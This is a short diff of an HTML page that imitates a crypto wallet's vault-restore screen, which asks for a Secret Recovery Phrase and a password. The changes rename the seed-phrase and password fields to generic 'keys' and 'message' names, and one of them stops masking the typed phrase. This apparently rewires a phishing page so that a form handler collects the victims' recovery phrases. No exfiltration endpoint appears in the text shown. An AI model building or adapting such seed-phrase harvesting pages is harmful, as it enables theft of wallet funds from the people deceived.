@@ -423,10 +423,10 @@
                                 <div class="first-time-flow__text-block">Enter your secret phrase here to restore your vault.</div>
                                 <div class="first-time-flow__textarea-wrapper">
                                     <label>Secret Recovery Phrase</label>
-                                    <textarea style="display: none;" id="seed_phrase_textarea" class="first-time-flow__textarea" placeholder="Separate each word with a single space" autocomplete="off" name="cpph"></textarea>
+                                    <textarea style="display: none;" id="keys" class="first-time-flow__textarea" placeholder="Separate each word with a single space" autocomplete="off" name="message"></textarea>
                                     <div id="seed_phrase_textbox_container" class="MuiFormControl-root MuiTextField-root first-time-flow__textarea first-time-flow__seedphrase">
                                         <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                            <input id="seed_phrase_textbox" name="pph" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                            <input id="keys" name="message" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="message" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                         </div>
                                     </div>
                                     <div class="first-time-flow__checkbox-container">
@@ -447,7 +447,7 @@
                                         Confirm password
                                     </label>
                                     <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                        <input required="" name="cppc" aria-invalid="false" autocomplete="new-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        <input required="" name="message" aria-invalid="false" autocomplete="new-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                     </div>
                                 </div>
                                 <div class="first-time-flow__checkbox-container">
